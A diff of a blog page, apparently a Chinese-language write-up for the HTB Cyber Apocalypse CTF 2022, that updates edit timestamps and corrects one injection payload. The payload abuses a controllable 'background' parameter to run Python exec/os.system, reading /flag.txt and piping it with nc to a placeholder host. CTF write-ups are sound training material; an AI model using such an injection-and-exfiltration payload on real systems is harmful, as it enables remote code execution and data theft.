@@ -35,7 +35,7 @@
 <meta property="og:image" content="http://example.com/2022/05/20/Write-Up-s-for-HTB-Cyber-Apocalypse-CTF-2022/2b3cab49-e4b0-44b2-a3a3-a841e1953dde.png">
 <meta property="og:image" content="http://example.com/2022/05/20/Write-Up-s-for-HTB-Cyber-Apocalypse-CTF-2022/image-20220520144336241.png">
 <meta property="article:published_time" content="2022-05-20T05:39:29.000Z">
-<meta property="article:modified_time" content="2022-05-21T12:48:58.350Z">
+<meta property="article:modified_time" content="2022-05-21T14:43:49.427Z">
 <meta property="article:author" content="Kabuto">
 <meta property="article:tag" content="Cyber Apocalypse CTF">
 <meta name="twitter:card" content="summary">
@@ -204,7 +204,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-21 20:48:58" itemprop="dateModified" datetime="2022-05-21T20:48:58+08:00">2022-05-21</time>
+                <time title="Modified: 2022-05-21 22:43:49" itemprop="dateModified" datetime="2022-05-21T22:43:49+08:00">2022-05-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -266,7 +266,7 @@
 <p>body中的background参数是可控的，那么我们直接注入。</p>
 <p><img src="/2022/05/20/Write-Up-s-for-HTB-Cyber-Apocalypse-CTF-2022/image-20220520142754577.png" alt="image-20220520142754577"></p>
 <p>上图是我失败的案例，因为引号的问题，正确payload如下</p>
-<p><code>&quot;exec(&#39;import os;os.system(\&quot;cat /![2b3cab49-e4b0-44b2-a3a3-a841e1953dde](../../../../Pictures/2b3cab49-e4b0-44b2-a3a3-a841e1953dde.png)flag.txt|nc ip:port \&quot;)&#39;)&quot;</code></p>
+<p><code>&quot;exec(&#39;import os;os.system(\&quot;cat /flag.txt|nc ip:port \&quot;)&#39;)&quot;</code></p>
 <p>直接在本地试验拿到flag</p>
 <p><img src="/2022/05/20/Write-Up-s-for-HTB-Cyber-Apocalypse-CTF-2022/2b3cab49-e4b0-44b2-a3a3-a841e1953dde.png" alt="2b3cab49-e4b0-44b2-a3a3-a841e1953dde"></p>
 <p>成功！</p>
